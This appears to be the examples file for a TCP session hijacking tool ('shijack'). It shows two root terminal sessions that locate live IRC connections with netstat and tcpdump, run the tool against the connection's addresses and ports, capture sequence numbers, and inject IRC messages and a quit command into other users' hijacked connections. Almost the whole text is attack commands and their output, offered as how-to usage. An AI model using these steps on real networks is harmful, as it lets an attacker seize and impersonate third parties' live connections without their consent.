Examples:

Local hijacking:
(root@inch shijack)# netstat -an | grep 6667
tcp4       0      0  203.43.200.22.2493      198.163.216.60.6667    ESTABLISHED
(root@inch shijack)# ./shijack-fbsd dc0 203.43.200.22 2493 198.163.216.60 6667
Waiting for SEQ/ACK  to arrive from the srcip to the dstip.
(To speed things up, try making some traffic between the two, /msg person asdf
Got packet! SEQ = 0xa1963181 ACK = 0xd4f7175f
Starting hijack session, Please use ^C to terminate.
Anything you enter from now on is sent to the hijacked TCP connection.
privmsg spwny :h0h0h0.
privmsg moo :you fat cow :(
^CClosing connection..
Done, Exiting.

Subnet hijacking:
(root@inch shijack)# tcpdump -n -i dc0 | grep 6667
tcpdump: listening on dc0
14:36:23.174889 206.221.255.190.6667 > 203.43.200.114.19970: P 2867450580:2867450719(139) ack 8410247 win 17503 (DF)
14:36:23.329866 203.43.200.114.19970 > 206.221.255.190.6667: . ack 139 win 7302 (DF)
^C
15 packets received by filter
0 packets dropped by kernel
(root@inch shijack)# ./shijack-fbsd dc0 203.43.200.114 19970 206.221.255.190 6667
Waiting for SEQ/ACK  to arrive from the srcip to the dstip.
(To speed things up, try making some traffic between the two, /msg person asdf
Got packet! SEQ = 0x8054de ACK = 0xaae9d5a3
Starting hijack session, Please use ^C to terminate.
Anything you enter from now on is sent to the hijacked TCP connection.
privmsg spwny :hi!
privmsg spwny :lalala.
quit :hehe!
^CClosing connection..
Done, Exiting.
